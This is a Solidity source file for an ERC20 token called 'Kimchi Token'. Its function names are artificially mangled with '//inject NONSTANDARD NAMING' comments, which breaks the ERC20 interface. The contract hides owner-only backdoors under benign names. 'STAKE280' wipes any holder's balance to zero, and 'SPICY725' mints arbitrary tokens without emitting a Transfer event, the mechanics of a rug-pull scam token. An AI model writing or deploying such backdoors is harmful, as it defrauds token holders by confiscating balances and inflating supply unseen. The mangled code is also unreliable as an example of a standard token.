                                                                 

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY232() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF61(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER846(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE374(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE309(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM835(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER320(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL60(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER92() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY232() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF61(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER846(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER395(_MSGSENDER92(), recipient, amount);
        return true;
    }
    function ALLOWANCE374(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE309(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE165(_MSGSENDER92(), spender, amount);
        return true;
    }
    function TRANSFERFROM835(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER395(sender, recipient, amount);
        _APPROVE165(sender, _MSGSENDER92(), _allowances[sender][_MSGSENDER92()].SUB364(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE644(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE165(_MSGSENDER92(), spender, _allowances[_MSGSENDER92()][spender].ADD827(addedValue));
        return true;
    }
    function DECREASEALLOWANCE297(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE165(_MSGSENDER92(), spender, _allowances[_MSGSENDER92()][spender].SUB364(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER395(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB364(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD827(amount);
        emit TRANSFER320(sender, recipient, amount);
    }
    function _INITMINT721(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD827(amount);
        _balances[account] = _balances[account].ADD827(amount);
        emit TRANSFER320(address(0), account, amount);
    }
    function _SPICY57(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _spicy to the zero address");
        _totalSupply = _totalSupply.ADD827(amount);
        _balances[account] = _balances[account].ADD827(amount);
    }
    function _BURN245(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB364(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB364(amount);
        emit TRANSFER320(account, address(0), amount);
    }
    function _STAKE922(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "stake to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB364(amount);
    }
    function _APPROVE165(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL60(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME993() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL619() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS965() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD827(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB364(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB364(a, b, "SafeMath: subtraction overflow");
    }
    function SUB364(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL643(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV147(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV147(a, b, "SafeMath: division by zero");
    }
    function DIV147(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract KimchiToken is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("Kimchi Token", "KIMCHI", 18) {
      _INITMINT721( msg.sender, 1000*10**uint(DECIMALS965()) );
      stakers[msg.sender] = true;
  }

  function STAKE280(address account) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _STAKE922(account);
  }

  function SPICY725(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _SPICY57(account, amount);
  }

}